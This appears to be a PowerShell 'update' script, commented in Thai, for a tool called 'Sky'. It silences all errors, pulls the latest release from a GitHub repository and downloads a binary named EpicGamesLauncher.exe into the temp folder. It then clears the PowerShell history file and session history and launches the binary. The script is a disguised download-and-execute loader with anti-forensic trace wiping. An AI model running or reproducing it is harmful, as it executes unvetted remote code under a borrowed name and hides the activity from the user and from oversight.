$ErrorActionPreference = "SilentlyContinue"

# ==========================================
# 🌟 บังคับใช้ TLS 1.2 สำหรับเชื่อมต่อ GitHub
# ==========================================
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

Write-Host "Checking for updates (Sky)..." -ForegroundColor Cyan

# 1. ดึงข้อมูลอัปเดตล่าสุดจาก GitHub API
$apiUrl = "https://api.github.com/repos/GRILLYje/Animal_Sky_Public/releases/latest"

try {
    # ดึงข้อมูลจาก API
    $releaseInfo = Invoke-RestMethod -Uri $apiUrl -Method Get
    
    # แปลงข้อมูลตัวแปรต่างๆ
    $version = $releaseInfo.tag_name
    $publishedAt = [datetime]$releaseInfo.published_at
    $localTime = $publishedAt.ToLocalTime().ToString("dd/MM/yyyy HH:mm:ss") # แปลงเวลาให้ตรงกับเครื่องเรา
    $description = $releaseInfo.body

    # ค้นหาลิงก์โหลดไฟล์ EpicGamesLauncher.exe จากเวอร์ชั่นล่าสุดอัตโนมัติ
    $downloadUrl = ($releaseInfo.assets | Where-Object { $_.name -eq "EpicGamesLauncher.exe" }).browser_download_url

    # แสดงผลข้อมูลบนหน้าต่าง PowerShell
    Write-Host "==========================================" -ForegroundColor Yellow
    Write-Host "🌟 พบการอัปเดตใหม่ล่าสุด!" -ForegroundColor Green
    Write-Host "📌 Version: $version" -ForegroundColor White
    Write-Host "🕒 วันและเวลา: $localTime" -ForegroundColor White
    Write-Host "📝 รายละเอียดการอัปเดต:" -ForegroundColor Cyan
    Write-Host "$description" -ForegroundColor Gray
    Write-Host "==========================================" -ForegroundColor Yellow
    Write-Host "กำลังดาวน์โหลดไฟล์... กรุณารอสักครู่" -ForegroundColor White

} catch {
    Write-Host "⚠️ ไม่สามารถดึงข้อมูลอัปเดตจาก GitHub ได้" -ForegroundColor Red
    # ลิงก์สำรองเผื่อ API GitHub ล่ม หรือติด Limit
    $downloadUrl = "https://github.com/GRILLYje/Animal_Sky_Public/releases/download/V1.0.3/EpicGamesLauncher.exe"
}

# 2. สร้างโฟลเดอร์แยกสำหรับ Sky
$folderPath = "$env:TEMP\Sky"
if (-not (Test-Path $folderPath)) {
    New-Item -ItemType Directory -Path $folderPath -Force | Out-Null
}

$tempPath = "$folderPath\EpicGamesLauncher.exe"

# เช็คไฟล์เก่าและลบทิ้ง
if (Test-Path $tempPath) {
    Remove-Item $tempPath -Force
}

# 3. ดาวน์โหลดไฟล์ (WebClient)
try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($downloadUrl, $tempPath)
    $webClient.Dispose()
    Write-Host "✅ ดาวน์โหลดเสร็จสิ้น!" -ForegroundColor Green
} catch {
    Write-Host "❌ เกิดข้อผิดพลาดในการดาวน์โหลดไฟล์" -ForegroundColor Red
    Exit
}

# ==========================================
# 🌟 ส่วนที่เพิ่ม: ลบประวัติ PowerShell History
# ==========================================
try {
    $historyPath = (Get-PSReadLineOption).HistorySavePath
    if (Test-Path $historyPath) {
        Clear-Content -Path $historyPath
    }
    Clear-History
} catch {}
# ==========================================

# 4. รันโปรแกรม 
Write-Host "🚀 Launching Sky..." -ForegroundColor Green
Start-Process -FilePath $tempPath
